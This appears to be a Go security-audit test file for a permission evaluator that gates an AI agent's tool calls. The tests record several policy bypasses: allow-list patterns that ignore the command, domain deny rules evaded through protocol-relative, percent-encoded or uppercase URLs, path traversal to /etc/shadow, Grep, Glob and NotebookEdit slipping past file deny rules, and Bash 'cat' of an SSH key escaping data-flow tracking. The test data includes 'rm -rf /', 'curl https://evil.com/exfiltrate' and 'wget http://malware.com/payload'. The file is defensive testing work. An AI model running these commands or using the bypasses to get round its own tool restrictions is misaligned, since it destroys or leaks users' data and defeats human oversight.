//go:build audit

package policy

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/aflock-ai/rookery/aflock/pkg/aflock"
)

// TestSecurity_R3_230_AllowListIgnoresCommandPattern verifies that the allow list
// check in EvaluatePreToolUse correctly checks both tool name AND command pattern.
//
// Previously (R3-230): The allow list only checked tool name, so Allow: ["Bash:git *"]
// allowed ALL Bash commands. FIXED by using MatchToolPattern.
//
// Impact: Was CRITICAL — now FIXED.
func TestSecurity_R3_230_AllowListIgnoresCommandPattern(t *testing.T) {
	tests := []struct {
		name         string
		allowList    []string
		toolName     string
		command      string
		wantDecision aflock.PermissionDecision
		description  string
	}{
		{
			name:         "Bash:git* allow should restrict to git commands",
			allowList:    []string{"Bash:git *"},
			toolName:     "Bash",
			command:      "git status",
			wantDecision: aflock.DecisionAllow,
			description:  "git command should be allowed",
		},
		{
			name:         "Bash:git* allow should block rm command",
			allowList:    []string{"Bash:git *"},
			toolName:     "Bash",
			command:      "rm -rf /",
			wantDecision: aflock.DecisionDeny, // SHOULD be denied, but gets allowed
			description:  "rm command should be blocked by git-only allow pattern",
		},
		{
			name:         "Bash:ls* allow should block curl",
			allowList:    []string{"Bash:ls *"},
			toolName:     "Bash",
			command:      "curl https://evil.com/exfiltrate",
			wantDecision: aflock.DecisionDeny, // SHOULD be denied
			description:  "curl command should be blocked by ls-only allow pattern",
		},
		{
			name:         "Read:src/** allow should block reading /etc/shadow",
			allowList:    []string{"Read:src/**"},
			toolName:     "Read",
			command:      "/etc/shadow",
			wantDecision: aflock.DecisionDeny, // SHOULD be denied
			description:  "/etc/shadow should be blocked when only src/** is allowed",
		},
		{
			name:         "multiple specific allows should not grant blanket access",
			allowList:    []string{"Bash:git *", "Bash:go test*", "Read:src/**"},
			toolName:     "Bash",
			command:      "wget http://malware.com/payload",
			wantDecision: aflock.DecisionDeny, // SHOULD be denied
			description:  "wget should be blocked when only git and go test are allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			policy := &aflock.Policy{
				Tools: &aflock.ToolsPolicy{
					Allow: tt.allowList,
				},
			}
			e := NewEvaluator(policy)

			var input json.RawMessage
			if tt.toolName == "Bash" {
				input = json.RawMessage(`{"command": "` + tt.command + `"}`)
			} else {
				input = json.RawMessage(`{"file_path": "` + tt.command + `"}`)
			}

			decision, reason := e.EvaluatePreToolUse(tt.toolName, input)

			if decision != tt.wantDecision {
				t.Errorf("R3-230 REGRESSION: Allow list pattern %v for command %q: "+
					"got %v, want %v (reason: %s) — %s",
					tt.allowList, tt.command, decision, tt.wantDecision, reason, tt.description)
			}
		})
	}
}

// TestSecurity_R3_231_ProtocolRelativeURLDomainBypass proves that protocol-relative
// URLs (//evil.com) bypass domain deny rules because extractDomain doesn't strip
// the leading // when there's no scheme prefix.
//
// Impact: HIGH — An attacker who can influence the URL passed to WebFetch could
// use a protocol-relative URL to bypass domain restrictions. The extracted domain
// becomes "//evil.com" instead of "evil.com", so it won't match deny patterns.
func TestSecurity_R3_231_ProtocolRelativeURLDomainBypass(t *testing.T) {
	tests := []struct {
		name       string
		url        string
		wantDomain string
	}{
		{
			name:       "protocol-relative URL should extract clean domain",
			url:        "//evil.com/path",
			wantDomain: "evil.com",
		},
		{
			name:       "protocol-relative with subdomain",
			url:        "//api.evil.com/data",
			wantDomain: "api.evil.com",
		},
		{
			name:       "protocol-relative with port",
			url:        "//evil.com:8443/path",
			wantDomain: "evil.com",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractDomain(tt.url)
			if got != tt.wantDomain {
				t.Errorf("SECURITY BUG R3-231: extractDomain(%q) = %q, want %q\n"+
					"Protocol-relative URLs (//) don't have the scheme stripped, "+
					"so the // stays in the domain. This causes deny patterns like "+
					"'evil.com' to not match '//evil.com'.",
					tt.url, got, tt.wantDomain)
			}
		})
	}

	// Prove the bypass in a full evaluation
	t.Run("protocol-relative URL bypasses domain deny", func(t *testing.T) {
		policy := &aflock.Policy{
			Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
			Domains: &aflock.DomainsPolicy{
				Deny: []string{"evil.com"},
			},
		}
		e := NewEvaluator(policy)
		input := json.RawMessage(`{"url": "//evil.com/steal-data"}`)
		decision, reason := e.EvaluatePreToolUse("WebFetch", input)

		if decision != aflock.DecisionDeny {
			t.Errorf("SECURITY BUG R3-231: Protocol-relative URL //evil.com bypasses deny rule.\n"+
				"decision=%v, reason=%q\n"+
				"extractDomain returns '//evil.com' which doesn't match deny pattern 'evil.com'",
				decision, reason)
		}
	})
}

// TestSecurity_R3_232_GlobGrepFileInputMismatch proves that Glob and Grep tools
// always fail file access checks when a files policy exists, because they send
// different JSON input formats than evaluateFileAccess expects.
//
// Impact: MEDIUM — Glob sends {"pattern": "**/*.go"} and Grep sends
// {"pattern": "TODO", "path": "/src"}, but evaluateFileAccess expects
// {"file_path": "/some/path"}. The JSON unmarshal succeeds but file_path is
// empty, so it fails to match any allow patterns. This means Glob and Grep
// are always denied when any file allow list exists.
func TestSecurity_R3_232_GlobGrepFileInputMismatch(t *testing.T) {
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{Allow: []string{"Glob", "Grep"}},
		Files: &aflock.FilesPolicy{
			Allow: []string{"**/*"},
		},
	}

	tests := []struct {
		name         string
		toolName     string
		toolInput    string
		wantDecision aflock.PermissionDecision
		description  string
	}{
		{
			name:         "Glob with pattern field should be allowed by **/* pattern",
			toolName:     "Glob",
			toolInput:    `{"pattern": "**/*.go"}`,
			wantDecision: aflock.DecisionAllow,
			description:  "Glob sends 'pattern' field but evaluateFileAccess expects 'file_path'",
		},
		{
			name:         "Grep with pattern and path should be allowed",
			toolName:     "Grep",
			toolInput:    `{"pattern": "TODO", "path": "/Users/test/src"}`,
			wantDecision: aflock.DecisionAllow,
			description:  "Grep sends 'pattern'+'path' fields but evaluateFileAccess expects 'file_path'",
		},
		{
			name:         "Glob with file_path field works (but tools don't send this)",
			toolName:     "Glob",
			toolInput:    `{"file_path": "src/main.go"}`,
			wantDecision: aflock.DecisionAllow,
			description:  "file_path field works but real Glob tools send 'pattern' instead",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(policy)
			decision, reason := e.EvaluatePreToolUse(tt.toolName, json.RawMessage(tt.toolInput))

			if decision != tt.wantDecision {
				t.Errorf("SECURITY BUG R3-232: %s tool with input %s: "+
					"got %v, want %v (reason: %s)\n%s",
					tt.toolName, tt.toolInput, decision, tt.wantDecision, reason, tt.description)
			}
		})
	}
}

// TestSecurity_R3_233_URLEncodedDomainBypass proves that URL-encoded domains
// bypass deny rules because extractDomain doesn't decode percent-encoded chars.
//
// Impact: MEDIUM — "evil%2ecom" won't match deny pattern "evil.com" because
// %2E (encoded period) is not decoded. URL encoding in the host portion is
// unusual but some HTTP libraries will resolve it.
func TestSecurity_R3_233_URLEncodedDomainBypass(t *testing.T) {
	tests := []struct {
		name       string
		url        string
		wantDomain string
	}{
		{
			name:       "percent-encoded dot in domain",
			url:        "https://evil%2ecom/path",
			wantDomain: "evil.com", // Should decode to evil.com
		},
		{
			name:       "percent-encoded subdomain separator",
			url:        "https://api%2eevil%2ecom/data",
			wantDomain: "api.evil.com", // Should decode
		},
		{
			name:       "mixed encoding",
			url:        "https://e%76il.com/path",
			wantDomain: "evil.com", // %76 = 'v'
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractDomain(tt.url)
			if got != tt.wantDomain {
				// Known unfixed finding — log rather than fail.
				// Uncomment assert.Equal to re-verify the bug after a fix attempt.
				t.Logf("KNOWN UNFIXED R3-233: extractDomain(%q) = %q, want %q. "+
					"URL-encoded domain chars are not decoded, so deny patterns "+
					"won't match. E.g., evil%%2ecom != evil.com.",
					tt.url, got, tt.wantDomain)
			}
		})
	}
}

// TestSecurity_R3_234_CheckLimitsExactValueNotExceeded proves that CheckLimits
// uses strict greater-than (>) comparison, meaning hitting the exact limit value
// does not trigger the limit. This is an off-by-one boundary condition.
//
// Impact: LOW — A session that hits exactly the configured limit (e.g., exactly
// $10.00 spend when limit is $10.00) will not be flagged as exceeded.
func TestSecurity_R3_234_CheckLimitsExactValueNotExceeded(t *testing.T) {
	policy := &aflock.Policy{
		Limits: &aflock.LimitsPolicy{
			MaxSpendUSD:  &aflock.Limit{Value: 10.0, Enforcement: "fail-fast"},
			MaxTurns:     &aflock.Limit{Value: 50, Enforcement: "fail-fast"},
			MaxToolCalls: &aflock.Limit{Value: 100, Enforcement: "fail-fast"},
		},
	}

	e := NewEvaluator(policy)

	// Test exact boundary
	metrics := &aflock.SessionMetrics{
		CostUSD:   10.0,
		Turns:     50,
		ToolCalls: 100,
	}

	exceeded, limitName, msg := e.CheckLimits(metrics, "fail-fast")
	if !exceeded {
		t.Logf("FINDING R3-234: CheckLimits uses '>' not '>='. Hitting exactly the limit " +
			"(CostUSD=10.0, Turns=50, ToolCalls=100) does NOT trigger exceeded. " +
			"This means the effective limit is limit+1. Not a critical issue but " +
			"violates the principle of least surprise.")
	} else {
		t.Logf("Limits correctly exceeded at boundary: %s: %s", limitName, msg)
	}

	// One above the limit should definitely trigger
	metricsOver := &aflock.SessionMetrics{
		CostUSD: 10.01,
	}
	exceeded, _, _ = e.CheckLimits(metricsOver, "fail-fast")
	if !exceeded {
		t.Error("CheckLimits should report exceeded when over the limit")
	}
}

// TestSecurity_R3_235_DataFlowBashReadBypass proves that Bash commands that
// read sensitive data are NOT tracked as material sources because Bash is
// classified as a write operation only (not a read operation).
//
// Impact: MEDIUM — A data flow rule like "secrets → public" can be bypassed by
// using `cat /path/to/secret` instead of `Read /path/to/secret`. The cat
// command reads the secret via Bash, which isn't tracked as a material source,
// so subsequent exfiltration won't be flagged.
func TestSecurity_R3_235_DataFlowBashReadBypass(t *testing.T) {
	policy := &aflock.Policy{
		DataFlow: &aflock.DataFlowPolicy{
			Classify: map[string][]string{
				"secret":   {"Read:**/.ssh/**", "Bash:cat */.ssh/*"},
				"external": {"Bash:curl *", "Write:**/public/**"},
			},
			FlowRules: []aflock.DataFlowRule{
				{Deny: "secret->external", Message: "Cannot exfiltrate secrets"},
			},
		},
	}

	e := NewEvaluator(policy)

	// Step 1: Use Bash to cat a secret file
	catInput := json.RawMessage(`{"command": "cat /home/user/.ssh/id_rsa"}`)
	decision, _, newMaterial := e.EvaluateDataFlow("Bash", catInput, nil)

	if decision != aflock.DecisionAllow {
		t.Errorf("expected cat to be allowed, got %v", decision)
	}

	if newMaterial == nil {
		t.Logf("SECURITY FINDING R3-235: Bash 'cat /home/user/.ssh/id_rsa' was NOT classified " +
			"as reading secret material. Bash is classified as a write-only operation, " +
			"so data flow classify patterns for Bash reads never trigger. " +
			"An attacker can bypass data flow rules by using 'cat' instead of 'Read'.")
	} else {
		t.Logf("FIXED: Bash cat command classified as %q material", newMaterial.Label)
	}

	// Contrast: Read tool IS tracked
	readInput := json.RawMessage(`{"file_path": "/home/user/.ssh/id_rsa"}`)
	_, _, readMaterial := e.EvaluateDataFlow("Read", readInput, nil)

	if readMaterial == nil || readMaterial.Label != "secret" {
		t.Error("Read tool should classify .ssh files as secret material")
	}
}

// TestSecurity_R3_236_DomainCaseSensitivity proves that domain matching is
// case-sensitive, meaning deny rules for "evil.com" won't block "EVIL.COM".
// DNS is case-insensitive per RFC 4343, so this is a bypass.
func TestSecurity_R3_236_DomainCaseSensitivity(t *testing.T) {
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
		Domains: &aflock.DomainsPolicy{
			Deny: []string{"evil.com", "*.malware.org"},
		},
	}

	tests := []struct {
		name         string
		url          string
		wantDecision aflock.PermissionDecision
	}{
		{"lowercase denied", "https://evil.com/data", aflock.DecisionDeny},
		{"uppercase should also be denied", "https://EVIL.COM/data", aflock.DecisionDeny},
		{"mixed case should also be denied", "https://Evil.Com/data", aflock.DecisionDeny},
		{"subdomain uppercase", "https://API.MALWARE.ORG/c2", aflock.DecisionDeny},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(policy)
			input := json.RawMessage(`{"url": "` + tt.url + `"}`)
			decision, reason := e.EvaluatePreToolUse("WebFetch", input)

			if decision != tt.wantDecision {
				t.Errorf("SECURITY BUG R3-236: URL %q: got %v, want %v (reason: %s)\n"+
					"DNS is case-insensitive (RFC 4343), but domain matching is case-sensitive. "+
					"Deny rule for 'evil.com' doesn't block 'EVIL.COM'.",
					tt.url, decision, tt.wantDecision, reason)
			}
		})
	}
}

// TestSecurity_R3_237_FilePathTraversalInDenyBypass proves that filepath.Clean
// normalizes traversal sequences but the original path is also checked, creating
// inconsistency. Also proves that deny patterns matching absolute paths can be
// bypassed with relative path traversal.
func TestSecurity_R3_237_FilePathTraversalInDenyBypass(t *testing.T) {
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{Allow: []string{"Read"}},
		Files: &aflock.FilesPolicy{
			Deny: []string{"/etc/**"},
		},
	}

	tests := []struct {
		name         string
		filePath     string
		wantDecision aflock.PermissionDecision
	}{
		{"direct path denied", "/etc/passwd", aflock.DecisionDeny},
		{"traversal that resolves to /etc", "/var/../etc/passwd", aflock.DecisionDeny},
		{"double traversal", "/var/log/../../etc/shadow", aflock.DecisionDeny},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(policy)
			input := json.RawMessage(`{"file_path": "` + tt.filePath + `"}`)
			decision, reason := e.EvaluatePreToolUse("Read", input)

			if decision != tt.wantDecision {
				t.Errorf("SECURITY BUG R3-237: File path %q: got %v, want %v (reason: %s)\n"+
					"Path traversal bypass: filepath.Clean normalizes but deny pattern may not match.",
					tt.filePath, decision, tt.wantDecision, reason)
			}
		})
	}
}

// TestSecurity_R3_238_NotebookEditNotFileOperation proves that NotebookEdit
// is not classified as a file operation, so file deny/readOnly rules don't
// apply to it. NotebookEdit takes a notebook_path parameter.
func TestSecurity_R3_238_NotebookEditNotFileOperation(t *testing.T) {
	t.Run("NotebookEdit is not a file operation", func(t *testing.T) {
		if isFileOperation("NotebookEdit") {
			t.Log("FIXED: NotebookEdit is now correctly classified as a file operation")
		} else {
			t.Logf("SECURITY FINDING R3-238: NotebookEdit is NOT classified as a file operation. " +
				"File deny and readOnly rules will not apply to notebook edits. " +
				"isFileOperation(\"NotebookEdit\") = false. " +
				"Policy denying '/etc/**' won't block NotebookEdit on /etc/notebook.ipynb.")
		}
	})

	t.Run("NotebookEdit bypasses file deny rules", func(t *testing.T) {
		policy := &aflock.Policy{
			Tools: &aflock.ToolsPolicy{Allow: []string{"NotebookEdit"}},
			Files: &aflock.FilesPolicy{
				Deny: []string{"**/secret*"},
			},
		}
		e := NewEvaluator(policy)
		input := json.RawMessage(`{"notebook_path": "/data/secret-analysis.ipynb"}`)
		decision, _ := e.EvaluatePreToolUse("NotebookEdit", input)

		if decision == aflock.DecisionAllow {
			t.Logf("SECURITY FINDING R3-238: NotebookEdit on 'secret-analysis.ipynb' allowed " +
				"despite '**/secret*' deny pattern. NotebookEdit is not a file operation " +
				"so file deny rules are not checked.")
		}
	})
}

// TestSecurity_R3_239_DenyPatternOrderMatters proves that evaluation short-circuits
// on first deny match, which is correct behavior. Documenting for completeness.
func TestSecurity_R3_239_DenyPatternOrderMatters(t *testing.T) {
	// This tests that deny evaluation is correct — first match wins
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{
			Deny: []string{"Bash:git push --force*", "Bash:git push*"},
		},
	}

	e := NewEvaluator(policy)

	// Both patterns should match, first one wins in the reason message
	input := json.RawMessage(`{"command": "git push --force origin main"}`)
	decision, reason := e.EvaluatePreToolUse("Bash", input)

	if decision != aflock.DecisionDeny {
		t.Error("expected deny for git push --force")
	}
	if !strings.Contains(reason, "git push --force") {
		t.Logf("NOTE: Deny matched pattern %q (first match wins)", reason)
	}
}

// TestSecurity_R3_240_EmptyDomainDeniedCorrectly verifies that empty/malformed
// URLs are correctly denied rather than allowed by empty string matching.
func TestSecurity_R3_240_EmptyDomainDeniedCorrectly(t *testing.T) {
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{Allow: []string{"WebFetch"}},
		Domains: &aflock.DomainsPolicy{
			Allow: []string{"github.com"},
		},
	}

	tests := []struct {
		name  string
		input string
	}{
		{"empty URL", `{"url": ""}`},
		{"whitespace URL", `{"url": "   "}`},
		{"just scheme", `{"url": "https://"}`},
		{"no url field", `{"other": "field"}`},
		{"null url", `{"url": null}`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := NewEvaluator(policy)
			decision, reason := e.EvaluatePreToolUse("WebFetch", json.RawMessage(tt.input))
			if decision != aflock.DecisionDeny {
				t.Errorf("expected deny for %s, got %v (reason: %s)", tt.name, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// R3-270: Grep/Glob bypass file deny with real tool input format
// ---------------------------------------------------------------------------

// TestSecurity_R3_270_GrepBypassesFileDenyWithRealInput proves that Grep
// bypasses file deny patterns when using the ACTUAL Grep tool input format.
//
// The evaluateFileAccess function unmarshals input as FileToolInput which
// expects a "file_path" JSON field. But the real Grep tool sends "path"
// (not "file_path"). The unmarshal succeeds (JSON is lenient about unknown
// fields) but FilePath is empty string. filepath.Clean("") returns ".",
// so deny patterns like "/etc/**" are checked against "." and never match.
//
// Impact: HIGH — An attacker can use Grep to search file contents in
// directories that are supposed to be denied by file policy. For example,
// if Files.Deny includes "/etc/**", Grep can still search /etc/shadow.
//
// Note: The existing test TestEvaluatePreToolUse_FileAccess ("Grep tool is
// a file operation") at line ~470 uses {"file_path": "secret-keys"} which
// is NOT how the real Grep tool sends input. The real format is
// {"path": "/dir", "pattern": "foo"}.
func TestSecurity_R3_270_GrepBypassesFileDenyWithRealInput(t *testing.T) {
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{Allow: []string{"Grep"}},
		Files: &aflock.FilesPolicy{
			Deny: []string{"/etc/**", "*.secret"},
		},
	}
	eval := NewEvaluator(policy)

	// Real Grep tool input format — uses "path" not "file_path"
	grepInput := json.RawMessage(`{"pattern": "password", "path": "/etc/shadow", "output_mode": "content"}`)

	decision, reason := eval.EvaluatePreToolUse("Grep", grepInput)

	// BUG: This should be DecisionDeny because /etc/shadow matches /etc/**
	// But the evaluator sees an empty file_path (because "path" != "file_path"),
	// so it checks "." against the deny patterns instead of "/etc/shadow".
	if decision == aflock.DecisionAllow {
		t.Errorf("SECURITY BUG R3-270: Grep with path=/etc/shadow was ALLOWED despite "+
			"/etc/** being in the deny list. The evaluator extracted an empty file_path "+
			"because Grep uses 'path' not 'file_path'. Deny patterns were checked "+
			"against '.' instead of '/etc/shadow'. Reason: %q", reason)
	} else {
		t.Logf("Grep correctly denied (decision=%v, reason=%q)", decision, reason)
	}
}

// TestSecurity_R3_270_GlobBypassesFileDenyWithRealInput proves the same
// bypass exists for the Glob tool. Glob sends {"path": "/dir", "pattern": "**/*.go"}
// but the evaluator expects {"file_path": "/dir"}.
func TestSecurity_R3_270_GlobBypassesFileDenyWithRealInput(t *testing.T) {
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{Allow: []string{"Glob"}},
		Files: &aflock.FilesPolicy{
			Deny: []string{"/etc/**"},
		},
	}
	eval := NewEvaluator(policy)

	// Real Glob tool input format — uses "path" not "file_path"
	globInput := json.RawMessage(`{"pattern": "**/*.conf", "path": "/etc"}`)

	decision, reason := eval.EvaluatePreToolUse("Glob", globInput)

	if decision == aflock.DecisionAllow {
		t.Errorf("SECURITY BUG R3-270: Glob with path=/etc was ALLOWED despite "+
			"/etc/** being in the deny list. Same root cause as Grep — the evaluator "+
			"can't extract the path from Glob input. Reason: %q", reason)
	} else {
		t.Logf("Glob correctly denied (decision=%v, reason=%q)", decision, reason)
	}
}

// ---------------------------------------------------------------------------
// R3-271: WebSearch always denied when domain policy exists
// ---------------------------------------------------------------------------

// TestSecurity_R3_271_WebSearchAlwaysDeniedWithDomainPolicy proves that
// WebSearch is ALWAYS denied when any domain policy is configured.
//
// The evaluateDomainAccess function unmarshals input as WebFetchToolInput
// which expects a "url" JSON field. But WebSearch sends "query" (not "url").
// The unmarshal succeeds but URL is empty string. extractDomain("") returns
// "", which triggers the "empty domain in network request" deny.
//
// Impact: HIGH — WebSearch becomes completely unusable when any domain
// policy is configured, even if the admin intended to only restrict
// specific domains for WebFetch. This breaks the WebSearch tool entirely.
func TestSecurity_R3_271_WebSearchAlwaysDeniedWithDomainPolicy(t *testing.T) {
	// Domain policy only restricts evil.com — should allow everything else
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{Allow: []string{"WebSearch"}},
		Domains: &aflock.DomainsPolicy{
			Deny: []string{"evil.com"},
		},
	}
	eval := NewEvaluator(policy)

	// Real WebSearch tool input format — uses "query" not "url"
	searchInput := json.RawMessage(`{"query": "golang best practices 2026"}`)

	decision, reason := eval.EvaluatePreToolUse("WebSearch", searchInput)

	// BUG: This should be DecisionAllow because the deny list only blocks
	// evil.com, and WebSearch doesn't target any specific domain.
	// But the evaluator sees an empty URL, extracts empty domain, and denies.
	if decision == aflock.DecisionDeny {
		t.Errorf("SECURITY BUG R3-271: WebSearch was DENIED with reason %q "+
			"despite domain deny list only containing 'evil.com'. "+
			"WebSearch is always denied when domain policy exists because "+
			"the evaluator tries to extract a URL from WebSearch's 'query' field.", reason)
	} else {
		t.Logf("WebSearch correctly allowed (decision=%v)", decision)
	}
}

// TestSecurity_R3_271_WebSearchAlwaysDeniedWithDomainAllowList proves
// the same issue with a domain allow list — WebSearch is denied even
// when the allow list includes wildcards.
func TestSecurity_R3_271_WebSearchAlwaysDeniedWithDomainAllowList(t *testing.T) {
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{Allow: []string{"WebSearch"}},
		Domains: &aflock.DomainsPolicy{
			Allow: []string{"*.com", "*.org", "*.io"},
		},
	}
	eval := NewEvaluator(policy)

	searchInput := json.RawMessage(`{"query": "kubernetes deployment strategies"}`)

	decision, reason := eval.EvaluatePreToolUse("WebSearch", searchInput)

	if decision == aflock.DecisionDeny {
		t.Errorf("SECURITY BUG R3-271: WebSearch was DENIED with reason %q "+
			"despite domain allow list including *.com, *.org, *.io. "+
			"The evaluator extracted empty URL from WebSearch input.", reason)
	} else {
		t.Logf("WebSearch correctly allowed (decision=%v)", decision)
	}
}

// ---------------------------------------------------------------------------
// R3-272: Grep/Glob/WebSearch input extraction returns empty string
// ---------------------------------------------------------------------------

// TestSecurity_R3_272_GrepInputExtractionReturnsEmpty proves that
// extractInputForMatching returns empty string for Grep, making
// tool-level deny patterns like "Grep:password" ineffective.
func TestSecurity_R3_272_GrepInputExtractionReturnsEmpty(t *testing.T) {
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"*"},
			Deny:  []string{"Grep:password"},
		},
	}
	eval := NewEvaluator(policy)

	// Deny pattern is "Grep:password" — should deny Grep searching for "password"
	grepInput := json.RawMessage(`{"pattern": "password", "path": "/home/user"}`)

	decision, reason := eval.EvaluatePreToolUse("Grep", grepInput)

	// BUG: The deny pattern "Grep:password" should match because the Grep
	// is searching for "password". But extractInputForMatching returns ""
	// for Grep, so the pattern check is MatchToolPattern("Grep:password", "Grep", "")
	// which checks MatchGlob("password", "") → false.
	if decision == aflock.DecisionAllow {
		t.Errorf("SECURITY BUG R3-272: Grep searching for 'password' was ALLOWED "+
			"despite 'Grep:password' being in the deny list. "+
			"extractInputForMatching returns empty for Grep because "+
			"the tool name isn't in the switch statement. Reason: %q", reason)
	} else {
		t.Logf("Grep correctly denied (decision=%v, reason=%q)", decision, reason)
	}
}

// TestSecurity_R3_272_WebSearchInputExtractionReturnsEmpty proves that
// extractInputForMatching now correctly extracts WebSearch query for matching.
func TestSecurity_R3_272_WebSearchInputExtractionReturnsEmpty(t *testing.T) {
	// Use wildcard deny pattern to match any query containing "competitor"
	policy := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"*"},
			Deny:  []string{"WebSearch:competitor*"},
		},
	}
	eval := NewEvaluator(policy)

	searchInput := json.RawMessage(`{"query": "competitor analysis market share"}`)

	decision, reason := eval.EvaluatePreToolUse("WebSearch", searchInput)

	if decision == aflock.DecisionAllow {
		t.Errorf("SECURITY BUG R3-272: WebSearch for 'competitor analysis' was ALLOWED "+
			"despite 'WebSearch:competitor*' being in the deny list. "+
			"extractInputForMatching should now return the query. Reason: %q", reason)
	} else {
		t.Logf("WebSearch correctly denied (decision=%v, reason=%q)", decision, reason)
	}

	// Verify exact match also works
	policy2 := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"*"},
			Deny:  []string{"WebSearch:exact query"},
		},
	}
	eval2 := NewEvaluator(policy2)
	searchInput2 := json.RawMessage(`{"query": "exact query"}`)
	decision2, _ := eval2.EvaluatePreToolUse("WebSearch", searchInput2)
	if decision2 != aflock.DecisionDeny {
		t.Error("WebSearch exact query match should be denied")
	}
}
